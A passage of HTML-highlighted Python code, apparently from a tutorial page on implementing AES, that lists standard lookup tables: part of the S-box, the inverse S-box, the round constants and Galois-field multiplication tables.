class="number">0x0b</span>, <span class="number">0xdb</span>,</span><br><span class="line">    <span class="number">0xe0</span>, <span class="number">0x32</span>, <span class="number">0x3a</span>, <span class="number">0x0a</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5c</span>, <span class="number">0xc2</span>, <span class="number">0xd3</span>, <span class="number">0xac</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xe4</span>, <span class="number">0x79</span>,</span><br><span class="line">    <span class="number">0xe7</span>, <span class="number">0xc8</span>, <span class="number">0x37</span>, <span class="number">0x6d</span>, <span class="number">0x8d</span>, <span class="number">0xd5</span>, <span class="number">0x4e</span>, <span class="number">0xa9</span>, <span class="number">0x6c</span>, <span class="number">0x56</span>, <span class="number">0xf4</span>, <span class="number">0xea</span>, <span class="number">0x65</span>, <span class="number">0x7a</span>, <span class="number">0xae</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0xba</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2e</span>, <span class="number">0x1c</span>, <span class="number">0xa6</span>, <span class="number">0xb4</span>, <span class="number">0xc6</span>, <span class="number">0xe8</span>, <span class="number">0xdd</span>, <span class="number">0x74</span>, <span class="number">0x1f</span>, <span class="number">0x4b</span>, <span class="number">0xbd</span>, <span class="number">0x8b</span>, <span class="number">0x8a</span>,</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0x3e</span>, <span class="number">0xb5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xf6</span>, <span class="number">0x0e</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xb9</span>, <span class="number">0x86</span>, <span class="number">0xc1</span>, <span class="number">0x1d</span>, <span class="number">0x9e</span>,</span><br><span class="line">    <span class="number">0xe1</span>, <span class="number">0xf8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xd9</span>, <span class="number">0x8e</span>, <span class="number">0x94</span>, <span class="number">0x9b</span>, <span class="number">0x1e</span>, <span class="number">0x87</span>, <span class="number">0xe9</span>, <span class="number">0xce</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xdf</span>,</span><br><span class="line">    <span class="number">0x8c</span>, <span class="number">0xa1</span>, <span class="number">0x89</span>, <span class="number">0x0d</span>, <span class="number">0xbf</span>, <span class="number">0xe6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2d</span>, <span class="number">0x0f</span>, <span class="number">0xb0</span>, <span class="number">0x54</span>, <span class="number">0xbb</span>, <span class="number">0x16</span>,]</span><br><span class="line"></span><br><span class="line">S_INV_BOX = [</span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0x6a</span>, <span class="number">0xd5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0xa5</span>, <span class="number">0x38</span>, <span class="number">0xbf</span>, <span class="number">0x40</span>, <span class="number">0xa3</span>, <span class="number">0x9e</span>, <span class="number">0x81</span>, <span class="number">0xf3</span>, <span class="number">0xd7</span>, <span class="number">0xfb</span>, </span><br><span class="line">    <span class="number">0x7c</span>, <span class="number">0xe3</span>, <span class="number">0x39</span>, <span class="number">0x82</span>, <span class="number">0x9b</span>, <span class="number">0x2f</span>, <span class="number">0xff</span>, <span class="number">0x87</span>, <span class="number">0x34</span>, <span class="number">0x8e</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0xc4</span>, <span class="number">0xde</span>, <span class="number">0xe9</span>, <span class="number">0xcb</span>, </span><br><span class="line">    <span class="number">0x54</span>, <span class="number">0x7b</span>, <span class="number">0x94</span>, <span class="number">0x32</span>, <span class="number">0xa6</span>, <span class="number">0xc2</span>, <span class="number">0x23</span>, <span class="number">0x3d</span>, <span class="number">0xee</span>, <span class="number">0x4c</span>, <span class="number">0x95</span>, <span class="number">0x0b</span>, <span class="number">0x42</span>, <span class="number">0xfa</span>, <span class="number">0xc3</span>, <span class="number">0x4e</span>, </span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x2e</span>, <span class="number">0xa1</span>, <span class="number">0x66</span>, <span class="number">0x28</span>, <span class="number">0xd9</span>, <span class="number">0x24</span>, <span class="number">0xb2</span>, <span class="number">0x76</span>, <span class="number">0x5b</span>, <span class="number">0xa2</span>, <span class="number">0x49</span>, <span class="number">0x6d</span>, <span class="number">0x8b</span>, <span class="number">0xd1</span>, <span class="number">0x25</span>, </span><br><span class="line">    <span class="number">0x72</span>, <span class="number">0xf8</span>, <span class="number">0xf6</span>, <span class="number">0x64</span>, <span class="number">0x86</span>, <span class="number">0x68</span>, <span class="number">0x98</span>, <span class="number">0x16</span>, <span class="number">0xd4</span>, <span class="number">0xa4</span>, <span class="number">0x5c</span>, <span class="number">0xcc</span>, <span class="number">0x5d</span>, <span class="number">0x65</span>, <span class="number">0xb6</span>, <span class="number">0x92</span>, </span><br><span class="line">    <span class="number">0x6c</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x50</span>, <span class="number">0xfd</span>, <span class="number">0xed</span>, <span class="number">0xb9</span>, <span class="number">0xda</span>, <span class="number">0x5e</span>, <span class="number">0x15</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0xa7</span>, <span class="number">0x8d</span>, <span class="number">0x9d</span>, <span class="number">0x84</span>, </span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x00</span>, <span class="number">0x8c</span>, <span class="number">0xbc</span>, <span class="number">0xd3</span>, <span class="number">0x0a</span>, <span class="number">0xf7</span>, <span class="number">0xe4</span>, <span class="number">0x58</span>, <span class="number">0x05</span>, <span class="number">0xb8</span>, <span class="number">0xb3</span>, <span class="number">0x45</span>, <span class="number">0x06</span>, </span><br><span class="line">    <span class="number">0xd0</span>, <span class="number">0x2c</span>, <span class="number">0x1e</span>, <span class="number">0x8f</span>, <span class="number">0xca</span>, <span class="number">0x3f</span>, <span class="number">0x0f</span>, <span class="number">0x02</span>, <span class="number">0xc1</span>, <span class="number">0xaf</span>, <span class="number">0xbd</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x8a</span>, <span class="number">0x6b</span>, </span><br><span class="line">    <span class="number">0x3a</span>, <span class="number">0x91</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x4f</span>, <span class="number">0x67</span>, <span class="number">0xdc</span>, <span class="number">0xea</span>, <span class="number">0x97</span>, <span class="number">0xf2</span>, <span class="number">0xcf</span>, <span class="number">0xce</span>, <span class="number">0xf0</span>, <span class="number">0xb4</span>, <span class="number">0xe6</span>, <span class="number">0x73</span>, </span><br><span class="line">    <span class="number">0x96</span>, <span class="number">0xac</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0xe7</span>, <span class="number">0xad</span>, <span class="number">0x35</span>, <span class="number">0x85</span>, <span class="number">0xe2</span>, <span class="number">0xf9</span>, <span class="number">0x37</span>, <span class="number">0xe8</span>, <span class="number">0x1c</span>, <span class="number">0x75</span>, <span class="number">0xdf</span>, <span class="number">0x6e</span>, </span><br><span class="line">    <span class="number">0x47</span>, <span class="number">0xf1</span>, <span class="number">0x1a</span>, <span class="number">0x71</span>, <span class="number">0x1d</span>, <span class="number">0x29</span>, <span class="number">0xc5</span>, <span class="number">0x89</span>, <span class="number">0x6f</span>, <span class="number">0xb7</span>, <span class="number">0x62</span>, <span class="number">0x0e</span>, <span class="number">0xaa</span>, <span class="number">0x18</span>, <span class="number">0xbe</span>, <span class="number">0x1b</span>, </span><br><span class="line">    <span class="number">0xfc</span>, <span class="number">0x56</span>, <span class="number">0x3e</span>, <span class="number">0x4b</span>, <span class="number">0xc6</span>, <span class="number">0xd2</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x9a</span>, <span class="number">0xdb</span>, <span class="number">0xc0</span>, <span class="number">0xfe</span>, <span class="number">0x78</span>, <span class="number">0xcd</span>, <span class="number">0x5a</span>, <span class="number">0xf4</span>, </span><br><span class="line">    <span class="number">0x1f</span>, <span class="number">0xdd</span>, <span class="number">0xa8</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xc7</span>, <span class="number">0x31</span>, <span class="number">0xb1</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>, </span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x7f</span>, <span class="number">0xa9</span>, <span class="number">0x19</span>, <span class="number">0xb5</span>, <span class="number">0x4a</span>, <span class="number">0x0d</span>, <span class="number">0x2d</span>, <span class="number">0xe5</span>, <span class="number">0x7a</span>, <span class="number">0x9f</span>, <span class="number">0x93</span>, <span class="number">0xc9</span>, <span class="number">0x9c</span>, <span class="number">0xef</span>, </span><br><span class="line">    <span class="number">0xa0</span>, <span class="number">0xe0</span>, <span class="number">0x3b</span>, <span class="number">0x4d</span>, <span class="number">0xae</span>, <span class="number">0x2a</span>, <span class="number">0xf5</span>, <span class="number">0xb0</span>, <span class="number">0xc8</span>, <span class="number">0xeb</span>, <span class="number">0xbb</span>, <span class="number">0x3c</span>, <span class="number">0x83</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x61</span>, </span><br><span class="line">    <span class="number">0x17</span>, <span class="number">0x2b</span>, <span class="number">0x04</span>, <span class="number">0x7e</span>, <span class="number">0xba</span>, <span class="number">0x77</span>, <span class="number">0xd6</span>, <span class="number">0x26</span>, <span class="number">0xe1</span>, <span class="number">0x69</span>, <span class="number">0x14</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, <span class="number">0x21</span>, <span class="number">0x0c</span>, <span class="number">0x7d</span>]</span><br><span class="line"></span><br><span class="line">RCON_BOX = [</span><br><span class="line">    <span class="number">0x8d</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1b</span>, <span class="number">0x36</span>, <span class="number">0x6c</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x4d</span>, <span class="number">0x9a</span>,</span><br><span class="line">    <span class="number">0x2f</span>, <span class="number">0x5e</span>, <span class="number">0xbc</span>, <span class="number">0x63</span>, <span class="number">0xc6</span>, <span class="number">0x97</span>, <span class="number">0x35</span>, <span class="number">0x6a</span>, <span class="number">0xd4</span>, <span class="number">0xb3</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0xef</span>, <span class="number">0xc5</span>, <span class="number">0x91</span>, <span class="number">0x39</span>,</span><br><span class="line">    <span class="number">0x72</span>, <span class="number">0xe4</span>, <span class="number">0xd3</span>, <span class="number">0xbd</span>, <span class="number">0x61</span>, <span class="number">0xc2</span>, <span class="number">0x9f</span>, <span class="number">0x25</span>, <span class="number">0x4a</span>, <span class="number">0x94</span>, <span class="number">0x33</span>, <span class="number">0x66</span>, <span class="number">0xcc</span>, <span class="number">0x83</span>, <span class="number">0x1d</span>, <span class="number">0x3a</span>,</span><br><span class="line">    <span class="number">0x74</span>, <span class="number">0xe8</span>, <span class="number">0xcb</span>, <span class="number">0x8d</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1b</span>, <span class="number">0x36</span>, <span class="number">0x6c</span>, <span class="number">0xd8</span>,</span><br><span class="line">    <span class="number">0xab</span>, <span class="number">0x4d</span>, <span class="number">0x9a</span>, <span class="number">0x2f</span>, <span class="number">0x5e</span>, <span class="number">0xbc</span>, <span class="number">0x63</span>, <span class="number">0xc6</span>, <span class="number">0x97</span>, <span class="number">0x35</span>, <span class="number">0x6a</span>, <span class="number">0xd4</span>, <span class="number">0xb3</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0xef</span>,</span><br><span class="line">    <span class="number">0xc5</span>, <span class="number">0x91</span>, <span class="number">0x39</span>, <span class="number">0x72</span>, <span class="number">0xe4</span>, <span class="number">0xd3</span>, <span class="number">0xbd</span>, <span class="number">0x61</span>, <span class="number">0xc2</span>, <span class="number">0x9f</span>, <span class="number">0x25</span>, <span class="number">0x4a</span>, <span class="number">0x94</span>, <span class="number">0x33</span>, <span class="number">0x66</span>, <span class="number">0xcc</span>,</span><br><span class="line">    <span class="number">0x83</span>, <span class="number">0x1d</span>, <span class="number">0x3a</span>, <span class="number">0x74</span>, <span class="number">0xe8</span>, <span class="number">0xcb</span>, <span class="number">0x8d</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1b</span>,</span><br><span class="line">    <span class="number">0x36</span>, <span class="number">0x6c</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x4d</span>, <span class="number">0x9a</span>, <span class="number">0x2f</span>, <span class="number">0x5e</span>, <span class="number">0xbc</span>, <span class="number">0x63</span>, <span class="number">0xc6</span>, <span class="number">0x97</span>, <span class="number">0x35</span>, <span class="number">0x6a</span>, <span class="number">0xd4</span>, <span class="number">0xb3</span>,</span><br><span class="line">    <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0xef</span>, <span class="number">0xc5</span>, <span class="number">0x91</span>, <span class="number">0x39</span>, <span class="number">0x72</span>, <span class="number">0xe4</span>, <span class="number">0xd3</span>, <span class="number">0xbd</span>, <span class="number">0x61</span>, <span class="number">0xc2</span>, <span class="number">0x9f</span>, <span class="number">0x25</span>, <span class="number">0x4a</span>, <span class="number">0x94</span>,</span><br><span class="line">    <span class="number">0x33</span>, <span class="number">0x66</span>, <span class="number">0xcc</span>, <span class="number">0x83</span>, <span class="number">0x1d</span>, <span class="number">0x3a</span>, <span class="number">0x74</span>, <span class="number">0xe8</span>, <span class="number">0xcb</span>, <span class="number">0x8d</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1b</span>, <span class="number">0x36</span>, <span class="number">0x6c</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x4d</span>, <span class="number">0x9a</span>, <span class="number">0x2f</span>, <span class="number">0x5e</span>, <span class="number">0xbc</span>, <span class="number">0x63</span>, <span class="number">0xc6</span>, <span class="number">0x97</span>, <span class="number">0x35</span>,</span><br><span class="line">    <span class="number">0x6a</span>, <span class="number">0xd4</span>, <span class="number">0xb3</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0xef</span>, <span class="number">0xc5</span>, <span class="number">0x91</span>, <span class="number">0x39</span>, <span class="number">0x72</span>, <span class="number">0xe4</span>, <span class="number">0xd3</span>, <span class="number">0xbd</span>, <span class="number">0x61</span>, <span class="number">0xc2</span>, <span class="number">0x9f</span>,</span><br><span class="line">    <span class="number">0x25</span>, <span class="number">0x4a</span>, <span class="number">0x94</span>, <span class="number">0x33</span>, <span class="number">0x66</span>, <span class="number">0xcc</span>, <span class="number">0x83</span>, <span class="number">0x1d</span>, <span class="number">0x3a</span>, <span class="number">0x74</span>, <span class="number">0xe8</span>, <span class="number">0xcb</span>, <span class="number">0x8d</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1b</span>, <span class="number">0x36</span>, <span class="number">0x6c</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x4d</span>, <span class="number">0x9a</span>, <span class="number">0x2f</span>, <span class="number">0x5e</span>, <span class="number">0xbc</span>, <span class="number">0x63</span>,</span><br><span class="line">    <span class="number">0xc6</span>, <span class="number">0x97</span>, <span class="number">0x35</span>, <span class="number">0x6a</span>, <span class="number">0xd4</span>, <span class="number">0xb3</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0xef</span>, <span class="number">0xc5</span>, <span class="number">0x91</span>, <span class="number">0x39</span>, <span class="number">0x72</span>, <span class="number">0xe4</span>, <span class="number">0xd3</span>, <span class="number">0xbd</span>,</span><br><span class="line">    <span class="number">0x61</span>, <span class="number">0xc2</span>, <span class="number">0x9f</span>, <span class="number">0x25</span>, <span class="number">0x4a</span>, <span class="number">0x94</span>, <span class="number">0x33</span>, <span class="number">0x66</span>, <span class="number">0xcc</span>, <span class="number">0x83</span>, <span class="number">0x1d</span>, <span class="number">0x3a</span>, <span class="number">0x74</span>, <span class="number">0xe8</span>, <span class="number">0xcb</span>, <span class="number">0x8d</span>]</span><br><span class="line"></span><br><span class="line">GF_MULT_1 = [</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x03</span>,<span class="number">0x04</span>,<span class="number">0x05</span>,<span class="number">0x06</span>,<span class="number">0x07</span>,<span class="number">0x08</span>,<span class="number">0x09</span>,<span class="number">0x0a</span>,<span class="number">0x0b</span>,<span class="number">0x0c</span>,<span class="number">0x0d</span>,<span class="number">0x0e</span>,<span class="number">0x0f</span>,</span><br><span class="line">    <span class="number">0x10</span>,<span class="number">0x11</span>,<span class="number">0x12</span>,<span class="number">0x13</span>,<span class="number">0x14</span>,<span class="number">0x15</span>,<span class="number">0x16</span>,<span class="number">0x17</span>,<span class="number">0x18</span>,<span class="number">0x19</span>,<span class="number">0x1a</span>,<span class="number">0x1b</span>,<span class="number">0x1c</span>,<span class="number">0x1d</span>,<span class="number">0x1e</span>,<span class="number">0x1f</span>,</span><br><span class="line">    <span class="number">0x20</span>,<span class="number">0x21</span>,<span class="number">0x22</span>,<span class="number">0x23</span>,<span class="number">0x24</span>,<span class="number">0x25</span>,<span class="number">0x26</span>,<span class="number">0x27</span>,<span class="number">0x28</span>,<span class="number">0x29</span>,<span class="number">0x2a</span>,<span class="number">0x2b</span>,<span class="number">0x2c</span>,<span class="number">0x2d</span>,<span class="number">0x2e</span>,<span class="number">0x2f</span>,</span><br><span class="line">    <span class="number">0x30</span>,<span class="number">0x31</span>,<span class="number">0x32</span>,<span class="number">0x33</span>,<span class="number">0x34</span>,<span class="number">0x35</span>,<span class="number">0x36</span>,<span class="number">0x37</span>,<span class="number">0x38</span>,<span class="number">0x39</span>,<span class="number">0x3a</span>,<span class="number">0x3b</span>,<span class="number">0x3c</span>,<span class="number">0x3d</span>,<span class="number">0x3e</span>,<span class="number">0x3f</span>,</span><br><span class="line">    <span class="number">0x40</span>,<span class="number">0x41</span>,<span class="number">0x42</span>,<span class="number">0x43</span>,<span class="number">0x44</span>,<span class="number">0x45</span>,<span class="number">0x46</span>,<span class="number">0x47</span>,<span class="number">0x48</span>,<span class="number">0x49</span>,<span class="number">0x4a</span>,<span class="number">0x4b</span>,<span class="number">0x4c</span>,<span class="number">0x4d</span>,<span class="number">0x4e</span>,<span class="number">0x4f</span>,</span><br><span class="line">    <span class="number">0x50</span>,<span class="number">0x51</span>,<span class="number">0x52</span>,<span class="number">0x53</span>,<span class="number">0x54</span>,<span class="number">0x55</span>,<span class="number">0x56</span>,<span class="number">0x57</span>,<span class="number">0x58</span>,<span class="number">0x59</span>,<span class="number">0x5a</span>,<span class="number">0x5b</span>,<span class="number">0x5c</span>,<span class="number">0x5d</span>,<span class="number">0x5e</span>,<span class="number">0x5f</span>,</span><br><span class="line">    <span class="number">0x60</span>,<span class="number">0x61</span>,<span class="number">0x62</span>,<span class="number">0x63</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x66</span>,<span class="number">0x67</span>,<span class="number">0x68</span>,<span class="number">0x69</span>,<span class="number">0x6a</span>,<span class="number">0x6b</span>,<span class="number">0x6c</span>,<span class="number">0x6d</span>,<span class="number">0x6e</span>,<span class="number">0x6f</span>,</span><br><span class="line">    <span class="number">0x70</span>,<span class="number">0x71</span>,<span class="number">0x72</span>,<span class="number">0x73</span>,<span class="number">0x74</span>,<span class="number">0x75</span>,<span class="number">0x76</span>,<span class="number">0x77</span>,<span class="number">0x78</span>,<span class="number">0x79</span>,<span class="number">0x7a</span>,<span class="number">0x7b</span>,<span class="number">0x7c</span>,<span class="number">0x7d</span>,<span class="number">0x7e</span>,<span class="number">0x7f</span>,</span><br><span class="line">    <span class="number">0x80</span>,<span class="number">0x81</span>,<span class="number">0x82</span>,<span class="number">0x83</span>,<span class="number">0x84</span>,<span class="number">0x85</span>,<span class="number">0x86</span>,<span class="number">0x87</span>,<span class="number">0x88</span>,<span class="number">0x89</span>,<span class="number">0x8a</span>,<span class="number">0x8b</span>,<span class="number">0x8c</span>,<span class="number">0x8d</span>,<span class="number">0x8e</span>,<span class="number">0x8f</span>,</span><br><span class="line">    <span class="number">0x90</span>,<span class="number">0x91</span>,<span class="number">0x92</span>,<span class="number">0x93</span>,<span class="number">0x94</span>,<span class="number">0x95</span>,<span class="number">0x96</span>,<span class="number">0x97</span>,<span class="number">0x98</span>,<span class="number">0x99</span>,<span class="number">0x9a</span>,<span class="number">0x9b</span>,<span class="number">0x9c</span>,<span class="number">0x9d</span>,<span class="number">0x9e</span>,<span class="number">0x9f</span>,</span><br><span class="line">    <span class="number">0xa0</span>,<span class="number">0xa1</span>,<span class="number">0xa2</span>,<span class="number">0xa3</span>,<span class="number">0xa4</span>,<span class="number">0xa5</span>,<span class="number">0xa6</span>,<span class="number">0xa7</span>,<span class="number">0xa8</span>,<span class="number">0xa9</span>,<span class="number">0xaa</span>,<span class="number">0xab</span>,<span class="number">0xac</span>,<span class="number">0xad</span>,<span class="number">0xae</span>,<span class="number">0xaf</span>,</span><br><span class="line">    <span class="number">0xb0</span>,<span class="number">0xb1</span>,<span class="number">0xb2</span>,<span class="number">0xb3</span>,<span class="number">0xb4</span>,<span class="number">0xb5</span>,<span class="number">0xb6</span>,<span class="number">0xb7</span>,<span class="number">0xb8</span>,<span class="number">0xb9</span>,<span class="number">0xba</span>,<span class="number">0xbb</span>,<span class="number">0xbc</span>,<span class="number">0xbd</span>,<span class="number">0xbe</span>,<span class="number">0xbf</span>,</span><br><span class="line">    <span class="number">0xc0</span>,<span class="number">0xc1</span>,<span class="number">0xc2</span>,<span class="number">0xc3</span>,<span class="number">0xc4</span>,<span class="number">0xc5</span>,<span class="number">0xc6</span>,<span class="number">0xc7</span>,<span class="number">0xc8</span>,<span class="number">0xc9</span>,<span class="number">0xca</span>,<span class="number">0xcb</span>,<span class="number">0xcc</span>,<span class="number">0xcd</span>,<span class="number">0xce</span>,<span class="number">0xcf</span>,</span><br><span class="line">    <span class="number">0xd0</span>,<span class="number">0xd1</span>,<span class="number">0xd2</span>,<span class="number">0xd3</span>,<span class="number">0xd4</span>,<span class="number">0xd5</span>,<span class="number">0xd6</span>,<span class="number">0xd7</span>,<span class="number">0xd8</span>,<span class="number">0xd9</span>,<span class="number">0xda</span>,<span class="number">0xdb</span>,<span class="number">0xdc</span>,<span class="number">0xdd</span>,<span class="number">0xde</span>,<span class="number">0xdf</span>,</span><br><span class="line">    <span class="number">0xe0</span>,<span class="number">0xe1</span>,<span class="number">0xe2</span>,<span class="number">0xe3</span>,<span class="number">0xe4</span>,<span class="number">0xe5</span>,<span class="number">0xe6</span>,<span class="number">0xe7</span>,<span class="number">0xe8</span>,<span class="number">0xe9</span>,<span class="number">0xea</span>,<span class="number">0xeb</span>,<span class="number">0xec</span>,<span class="number">0xed</span>,<span class="number">0xee</span>,<span class="number">0xef</span>,</span><br><span class="line">    <span class="number">0xf0</span>,<span class="number">0xf1</span>,<span class="number">0xf2</span>,<span class="number">0xf3</span>,<span class="number">0xf4</span>,<span class="number">0xf5</span>,<span class="number">0xf6</span>,<span class="number">0xf7</span>,<span class="number">0xf8</span>,<span class="number">0xf9</span>,<span class="number">0xfa</span>,<span class="number">0xfb</span>,<span class="number">0xfc</span>,<span class="number">0xfd</span>,<span class="number">0xfe</span>,<span class="number">0xff</span>]</span><br><span class="line"></span><br><span class="line">GF_MULT_2 = [</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0x04</span>,<span class="number">0x06</span>,<span class="number">0x08</span>,<span class="number">0x0a</span>,<span class="number">0x0c</span>,<span class="number">0x0e</span>,<span class="number">0x10</span>,<span class="number">0x12</span>,<span class="number">0x14</span>,<span class="number">0x16</span>,<span class="number">0x18</span>,<span class="number">0x1a</span>,<span class="number">0x1c</span>,<span class="number">0x1e</span>,</span><br><span class="line">    <span class="number">0x20</span>,<span class="number">0x22</span>,<span class="number">0x24</span>,<span class="number">0x26</span>,<span class="number">0x28</span>,<span class="number">0x2a</span>,<span class="number">0x2c</span>,<span class="number">0x2e</span>,<span class="number">0x30</span>,<span class="number">0x32</span>,<span class="number">0x34</span>,<span class="number">0x36</span>,<span class="number">0x38</span>,<span class="number">0x3a</span>,<span class="number">0x3c</span>,<span class="number">0x3e</span>,</span><br><span class="line">    <span class="number">0x40</span>,<span class="number">0x42</span>,<span class="number">0x44</span>,<span class="number">0x46</span>,<span class="number">0x48</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,<span class="number">0x4e</span>,<span class="number">0x50</span>,<span class="number">0x52</span>,<span class="number">0x54</span>,<span class="number">0x56</span>,<span class="number">0x58</span>,<span class="number">0x5a</span>,<span class="number">0x5c</span>,<span class="number">0x5e</span>,</span><br><span class="line">    <span class="number">0x60</span>,<span class="number">0x62</span>,<span class="number">0x64</span>,<span class="number">0x66</span>,<span class="number">0x68</span>,<span class="number">0x6a</span>,<span class="number">0x6c</span>,<span class="number">0x6e</span>,<span class="number">0x70</span>,<span class="number">0x72</span>,<span class="number">0x74</span>,<span class="number">0x76</span>,<span class="number">0x78</span>,<span class="number">0x7a</span>,<span class="number">0x7c</span>,<span class="number">0x7e</span>,</span><br><span class="line">    <span class="number">0x80</span>,<span class="number">0x82</span>,<span class="number">0x84</span>,<span class="number">0x86</span>,<span class="number">0x88</span>,<span class="number">0x8a</span>,<span class="number">0x8c</span>,<span class="number">0x8e</span>,<span class="number">0x90</span>,<span class="number">0x92</span>,<span class="number">0x94</span>,<span class="number">0x96</span>,<span class="number">0x98</span>,<span class="number">0x9a</span>,<span class="number">0x9c</span>,<span class="number">0x9e</span>,</span><br><span class="line">    <span class="number">0xa0</span>,<span class="number">0xa2</span>,<span class="number">0xa4</span>,<span class="number">0xa6</span>,<span class="number">0xa8</span>,<span class="number">0xaa</span>,<span class="number">0xac</span>,<span class="number">0xae</span>,<span class="number">0xb0</span>,<span class="number">0xb2</span>,<span class="number">0xb4</span>,<span class="number">0xb6</span>,<span class="number">0xb8</span>,<span class="number">0xba</span>,<span class="number">0xbc</span>,<span class="number">0xbe</span>,</span><br><span class="line">    <span class="number">0xc0</span>,<span class="number">0xc2</span>,<span class="number">0xc4</span>,<span class="number">0xc6</span>,<span class="number">0xc8</span>,<span class="number">0xca</span>,<span class="number">0xcc</span>,<span class="number">0xce</span>,<span class="number">0xd0</span>,<span class="number">0xd2</span>,<span class="number">0xd4</span>,<span class="number">0xd6</span>,<span class="number">0xd8</span>,<span class="number">0xda</span>,<span class="number">0xdc</span>,<span class="number">0xde</span>,</span><br><span class="line">    <span class="number">0xe0</span>,<span class="number">0xe2</span>,<span class="number">0xe4</span>,<span class="number">0xe6</span>,<span class="number">0xe8</span>,<span class="number">0xea</span>,<span class="number">0xec</span>,<span class="number">0xee</span>,<span class="number">0xf0</span>,<span class="number">0xf2</span>,<span class="number">0xf4</span>,<span class="number">0xf6</span>,<span class="number">0xf8</span>,<span class="number">0xfa</span>,<span class="number">0xfc</span>,<span class="number">0xfe</span>,</span><br><span class="line">    <span class="number">0x1b</span>,<span class="number">0x19</span>,<span class="number">0x1f</span>,<span class="number">0x1d</span>,<span class="number">0x13</span>,<span class="number">0x11</span>,<span class="number">0x17</span>,<span class="number">0x15</span>,<span class="number">0x0b</span>,<span class="number">0x09</span>,<span class="number">0x0f</span>,<span class="number">0x0d</span>,<span class="number">0x03</span>,<span class="number">0x01</span>,<span class="number">0x07</span>,<span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x3b</span>,<span class="number">0x39</span>,<span class="number">0x3f</span>,<span class="number">0x3d</span>,<span class="number">0x33</span>,<span class="number">0x31</span>,<span class="number">0x37</span>,<span class="number">0x35</span>,<span class="number">0x2b</span>,<span class="number">0x29</span>,<span class="number">0x2f</span>,<span class="number">0x2d</span>,<span class="number">0x23</span>,<span class="number">0x21</span>,<span class="number">0x27</span>,<span class="number">0x25</span>,</span><br><span class="line">    <span class="number">0x5b</span>,<span class="number">0x59</span>,<span class="number">0x5f</span>,<span class="number">0x5d</span>,<span class="number">0x53</span>,<span class="number">0x51</span>,<span class="number">0x57</span>,<span class="number">0x55</span>,<span class="number">0x4b</span>,<span class="number">0x49</span>,<span class="number">0x4f</span>,<span class="number">0x4d</span>,<span class="number">0x43</span>,<span class="number">0x41</span>,<span class="number">0x47</span>,<span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0x7b</span>,<span class="number">0x79</span>,<span class="number">0x7f</span>,<span 